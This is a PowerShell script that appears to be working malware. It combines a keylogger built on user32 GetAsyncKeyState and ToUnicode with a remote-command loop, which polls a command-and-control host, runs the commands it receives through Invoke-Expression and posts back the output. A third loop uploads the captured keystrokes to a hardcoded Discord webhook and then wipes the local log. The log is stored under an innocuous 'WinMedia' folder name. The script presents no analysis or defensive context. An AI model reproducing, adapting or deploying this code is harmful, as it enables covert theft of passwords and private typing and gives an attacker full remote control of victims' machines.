# 1. Direct variable definitions
$PCName     = "chase"
$WebhookUrl = "https://discord.com/api/webhooks/1505177594226540655/BZPbc_W_oqVyfZEM0B5crFb3v3C03lgFeAU9DcdGrzUUCm_JbqsKoA8gIJMm4nlGDoxr"
$C2Url      = "https://chase-4ebb.onrender.com"
$dir        = "$env:LOCALAPPDATA\WinMedia"

if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }
$logFile = "$dir\data.txt"

# 2. Rebuilt Native C# Keyboard State Engine (Translates Case States Perfectly)
$Source = @'
using System;
using System.Text;
using System.Runtime.InteropServices;

public class KeyEngine {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);
    [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint uCode, uint uMapType);
    [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
}
'@
Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue

$c2Interval = 0
$discordInterval = 0
$headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }

while ($true) {
    # ================= ENGINE A: HIGH-SPEED UNICODE KEYLOGGER =================
    # Scan standard keyboard inputs (Skipping useless mouse buttons to maximize polling speed)
    for ($i = 8; $i -le 190; $i++) {
        if ([KeyEngine]::GetAsyncKeyState($i) -eq -32767) {
            $keyText = ""
            
            # Catch structural execution key combinations explicitly
            $isCtrl = ([KeyEngine]::GetAsyncKeyState(17) -band 0x8000)
            if ($isCtrl -and $i -ne 17) {
                $rawChar = [char]$i
                try { " [CTRL+$rawChar] " | Out-File $logFile -Append -NoNewline -ErrorAction SilentlyContinue } catch {}
                continue
            }

            switch ($i) {
                8   { $keyText = " [BACKSPACE] " }
                9   { $keyText = " [TAB] " }
                13  { $keyText = "`n" }
                16  { $keyText = "" } # Handled natively by keyboard mapping state arrays
                17  { $keyText = "" } # Handled above
                18  { $keyText = " [ALT] " }
                20  { $keyText = " [CAPS] " }
                27  { $keyText = " [ESC] " }
                32  { $keyText = " " }
                46  { $keyText = " [DEL] " }
                default {
                    # Query active memory tables to determine if letters are lower or upper case natively
                    $keyState = New-Object byte[] 256
                    [KeyEngine]::GetKeyboardState($keyState) | Out-Null
                    $scanCode = [KeyEngine]::MapVirtualKey($i, 0)
                    $buffer = New-Object System.Text.StringBuilder 5

                    $rc = [KeyEngine]::ToUnicode($i, $scanCode, $keyState, $buffer, $buffer.Capacity, 0)
                    if ($rc -gt 0) { $keyText = $buffer.ToString() }
                }
            }

            if ($keyText -ne "") {
                try { $keyText | Out-File $logFile -Append -NoNewline -ErrorAction SilentlyContinue } catch {}
            }
        }
    }

    # ================= ENGINE B: REMOTE RCE POLLING LOOP =================
    if ($c2Interval -ge 500) {
        try {
            $cmdResponse = Invoke-RestMethod -Uri "${C2Url}/get_cmd?id=${PCName}" -Method Get -Headers $headers -TimeoutSec 5
            if ($cmdResponse -and $cmdResponse -ne 'wait') {
                $output = (Invoke-Expression $cmdResponse 2>&1 | Out-String)
                if (!$output) { $output = 'Command executed with no return data.' }
                
                # FIXED: Added explicit plain-text Content-Type header to ensure Flask accepts the body string
                $postUrl = "${C2Url}/send_res?id=${PCName}"
                Invoke-RestMethod -Uri $postUrl -Method Post -Body $output -ContentType "text/plain" -Headers $headers -TimeoutSec 5 | Out-Null
            }
        } catch {}
        $c2Interval = 0
    }

    # ================= ENGINE C: DISCORD EXFILTRATION LOOP =================
    if ($discordInterval -ge 6000) {
        if (Test-Path $logFile) {
            if ((Get-Item $logFile).Length -gt 0) {
                try {
                    $timestamp = Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'
                    $fileName = "${PCName}_${timestamp}.txt"
                    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form @{ file = Get-Item $logFile; filename = $fileName } -TimeoutSec 10 | Out-Null
                    Clear-Content $logFile -ErrorAction SilentlyContinue
                } catch {}
            }
        }
        $discordInterval = 0
    }

    # Fast loop delay (5ms maximizes logging accuracy without spiking local CPU)
    Start-Sleep -m 5
    $c2Interval += 5
    $discordInterval += 5
}
